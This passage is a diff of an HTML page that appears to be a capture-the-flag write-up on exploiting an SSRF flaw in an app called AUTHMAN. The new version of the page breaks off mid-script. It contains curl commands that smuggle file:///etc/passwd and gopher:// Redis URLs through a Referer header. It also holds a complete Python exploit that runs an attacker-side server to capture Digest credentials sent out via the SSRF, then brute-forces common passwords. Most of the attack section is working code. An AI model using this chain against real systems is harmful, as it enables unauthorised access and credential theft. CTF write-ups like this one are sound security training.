+</div><h3 id="scenario-4-protocol-smuggling">Scenario 4: Protocol Smuggling<a hidden class="anchor" aria-hidden="true" href="#scenario-4-protocol-smuggling">#</a></h3>
 <p>While the code uses <code>requests.get()</code>, you might try:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># File protocol (usually blocked by requests library)</span>
-</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#34;Referer: file:///etc/passwd&#34;</span> http://TARGET:5000/api/check
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Gopher protocol for Redis/SMTP exploitation</span>
-</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#34;Referer: gopher://localhost:6379/_&#34;</span> http://TARGET:5000/api/check
-</span></span></code></pre></div><hr>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># File protocol (usually blocked by requests library)</span>
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;Referer: file:///etc/passwd&#34;</span> http://TARGET:5000/api/check
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Gopher protocol for Redis/SMTP exploitation</span>
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;Referer: gopher://localhost:6379/_&#34;</span> http://TARGET:5000/api/check
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
 <h2 id="proof-of-concept---complete-attack-chain">Proof of Concept - Complete Attack Chain<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept---complete-attack-chain">#</a></h2>
 <p>Here&rsquo;s a complete, automated exploit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">AUTHMAN SSRF Exploit - Complete Attack Chain
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Captures credentials and authenticates to retrieve the FLAG
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> threading
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> requests.auth <span style="color:#f92672">import</span> HTTPDigestAuth
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Configuration</span>
-</span></span><span style="display:flex;"><span>TARGET_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://localhost:5000&#34;</span>
-</span></span><span style="display:flex;"><span>ATTACKER_SERVER_PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">8080</span>
-</span></span><span style="display:flex;"><span>ATTACKER_IP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;YOUR_PUBLIC_IP&#34;</span>  <span style="color:#75715e"># Change this</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>captured_creds <span style="color:#f92672">=</span> {}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 1: Create credential capture server</span>
-</span></span><span style="display:flex;"><span>capture_app <span style="color:#f92672">=</span> Flask(__name__)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@capture_app.route</span>(<span style="color:#e6db74">&#39;/auth&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">capture</span>():
-</span></span><span style="display:flex;"><span>    auth_header <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Authorization&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> auth_header <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39;username=&#39;</span> <span style="color:#f92672">in</span> auth_header:
-</span></span><span style="display:flex;"><span>        username <span style="color:#f92672">=</span> auth_header<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;username=&#34;&#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;&#34;&#39;</span>)[<span style="color:#ae81ff">0</span>]
-</span></span><span style="display:flex;"><span>        
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Extract realm and nonce to replay authentication</span>
-</span></span><span style="display:flex;"><span>        realm <span style="color:#f92672">=</span> auth_header<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;realm=&#34;&#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;&#34;&#39;</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;realm=&#39;</span> <span style="color:#f92672">in</span> auth_header <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">None</span>
-</span></span><span style="display:flex;"><span>        nonce <span style="color:#f92672">=</span> auth_header<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;nonce=&#34;&#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;&#34;&#39;</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;nonce=&#39;</span> <span style="color:#f92672">in</span> auth_header <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">None</span>
-</span></span><span style="display:flex;"><span>        
-</span></span><span style="display:flex;"><span>        captured_creds[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">=</span> username
-</span></span><span style="display:flex;"><span>        captured_creds[<span style="color:#e6db74">&#39;realm&#39;</span>] <span style="color:#f92672">=</span> realm
-</span></span><span style="display:flex;"><span>        captured_creds[<span style="color:#e6db74">&#39;nonce&#39;</span>] <span style="color:#f92672">=</span> nonce
-</span></span><span style="display:flex;"><span>        captured_creds[<span style="color:#e6db74">&#39;full_auth&#39;</span>] <span style="color:#f92672">=</span> auth_header
-</span></span><span style="display:flex;"><span>        
-</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Captured credentials for user: </span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Full auth header: </span><span style="color:#e6db74">{</span>auth_header<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Return 401 to trigger auth</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#ae81ff">401</span>, {
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;WWW-Authenticate&#39;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Digest realm=&#34;test&#34;, qop=&#34;auth&#34;, nonce=&#34;capture123&#34;, opaque=&#34;xyz&#34;&#39;</span>
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run_capture_server</span>():
-</span></span><span style="display:flex;"><span>    capture_app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span>ATTACKER_SERVER_PORT, debug<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, use_reloader<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 2: Main exploit</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] Starting AUTHMAN SSRF Exploit...&#34;</span>)
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] Target: </span><span style="color:#e6db74">{</span>TARGET_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] Attacker server: http://</span><span style="color:#e6db74">{</span>ATTACKER_IP<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>ATTACKER_SERVER_PORT<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Start capture server in background</span>
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[*] Starting credential capture server...&#34;</span>)
-</span></span><span style="display:flex;"><span>    capture_thread <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>run_capture_server, daemon<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
-</span></span><span style="display:flex;"><span>    capture_thread<span style="color:#f92672">.</span>start()
-</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">2</span>)  <span style="color:#75715e"># Wait for server to start</span>
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Trigger SSRF</span>
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[*] Triggering SSRF vulnerability...&#34;</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(
-</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>TARGET_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/api/check&#34;</span>,
-</span></span><span style="display:flex;"><span>            headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;Referer&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>ATTACKER_IP<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>ATTACKER_SERVER_PORT<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>},
-</span></span><span style="display:flex;"><span>            timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>
-</span></span><span style="display:flex;"><span>        )
-</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] SSRF triggered! Status: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Response: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>json()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
-</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[-] Error triggering SSRF: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Wait for credentials to be captured</span>
-</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">2</span>)
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> captured_creds:
-</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[-] No credentials captured. Attack failed.&#34;</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] SUCCESS! Captured credentials:&#34;</span>)
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;    Username: </span><span style="color:#e6db74">{</span>captured_creds<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;username&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Step 3: Use captured username to authenticate</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Since we know the username, we can now try to authenticate</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># In a real scenario, you&#39;d need to crack the password or replay the auth</span>
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[*] Attempting to access protected endpoint...&#34;</span>)
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[!] Note: You need the actual password to complete authentication&#34;</span>)
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[!] The captured digest can be used for offline cracking&#34;</span>)
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> captured_creds<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;username&#39;</span>)
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Captured username: </span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] You can now attempt to:&#34;</span>)
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;    1. Brute force the password using digest cracking&#34;</span>)
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;    2. If password is weak, try common passwords:&#34;</span>)
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Try common passwords</span>
-</span></span><span style="display:flex;"><span>    common_passwords <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;password&#39;</span>, <span style="color:#e6db74">&#39;123456&#39;</span>, <span style="color:#e6db74">&#39;admin&#39;</span>, username, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">123&#39;</span>]
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> password <span style="color:#f92672">in</span> common_passwords:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>            resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(
-</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>TARGET_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/auth&#34;</span>,
-</span></span><span style="display:flex;"><span>                auth<span style="color:#f92672">=</span>HTTPDigestAuth(username, password),
-</span></span><span style="display:flex;"><span>                timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>
-</span></span><span style="display:flex;"><span>            )
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> resp<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
-</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+++] AUTHENTICATION SUCCESS with password: </span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+++] FLAG CAPTURED:&#34;</span>)
-</span></span><span style="display:flex;"><span>                print(resp<span style="color:#f92672">.</span>text)
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[-] Common passwords failed. Manual cracking required.&#34;</span>)
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] Digest auth details captured: </span><span style="color:#e6db74">{</span>captured_creds[<span style="color:#e6db74">&#39;full_auth&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
-</span></span><span style="display:flex;"><span>    exploit()
-</span></span></code></pre></div><p><strong>Run the exploit:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 exploit.py
-</span></span></code></pre></div><hr>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">AUTHMAN SSRF Exploit - Complete Attack Chain
+</span></span></span><span class="line"><span class="cl"><span class="s2">Captures credentials and authenticates to retrieve the FLAG
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">requests.auth</span> <span class="kn">import</span> <span class="n">HTTPDigestAuth</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Configuration</span>
+</span></span><span class="line"><span class="cl"><span class="n">TARGET_URL</span> <span class="o">=</span> <span class="s2">&#34;http://localhost:5000&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">ATTACKER_SERVER_PORT</span> <span class="o">=</span> <span class="mi">8080</span>
+</span></span><span class="line"><span class="cl"><span class="n">ATTACKER_IP</span> <span class="o">=</span> <span class="s2">&#34;YOUR_PUBLIC_IP&#34;</span>  <span class="c1"># Change this</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">captured_creds</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 1: Create credential capture server</span>
+</span></span><span class="line"><span class="cl"><span class="n">capture_app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@capture_app.route</span><span class="p">(</span><span class="s1">&#39;/auth&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">capture</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">auth_header</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Authorization&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">auth_header</span> <span class="ow">and</span> <span class="s1">&#39;username=&#39;</span> <span class="ow">in</span> <span class="n">auth_header</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">auth_header</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;username=&#34;&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># Extract realm and nonce to replay authentication</span>
+</span></span><span class="line"><span class="cl">        <span class="n">realm</span> <span class="o">=</span> <span class="n">auth_header</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;realm=&#34;&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="k">if</span> <span class="s1">&#39;realm=&#39;</span> <span class="ow">in</span> <span class="n">auth_header</span> <span class="k">else</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">        <span class="n">nonce</span> <span class="o">=</span> <span class="n">auth_header</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;nonce=&#34;&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="k">if</span> <span class="s1">&#39;nonce=&#39;</span> <span class="ow">in</span> <span class="n">auth_header</span> <span class="k">else</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">captured_creds</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
+</span></span><span class="line"><span class="cl">        <span class="n">captured_creds</span><span class="p">[</span><span class="s1">&#39;realm&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">realm</span>
+</span></span><span class="line"><span class="cl">        <span class="n">captured_creds</span><span class="p">[</span><span class="s1">&#39;nonce&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">nonce</span>
+</span></span><span class="line"><span class="cl">        <span class="n">captured_creds</span><span class="p">[</span><span class="s1">&#39;full_auth&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">auth_header</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] Captured credentials for user: </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Full auth header: </span><span class="si">{</span><span class="n">auth_header</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Return 401 to trigger auth</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">401</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;WWW-Authenticate&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;Digest realm=&#34;test&#34;, qop=&#34;auth&#34;, nonce=&#34;capture123&#34;, opaque=&#34;xyz&#34;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">run_capture_server</span><span class="p">():</span>
